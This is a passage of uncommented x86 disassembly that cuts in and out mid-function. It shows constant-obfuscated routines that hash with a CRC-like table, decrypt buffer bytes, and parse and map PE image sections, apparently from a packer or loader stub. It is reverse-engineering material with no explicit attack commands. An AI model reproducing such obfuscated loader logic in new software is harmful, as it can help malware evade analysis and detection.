  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
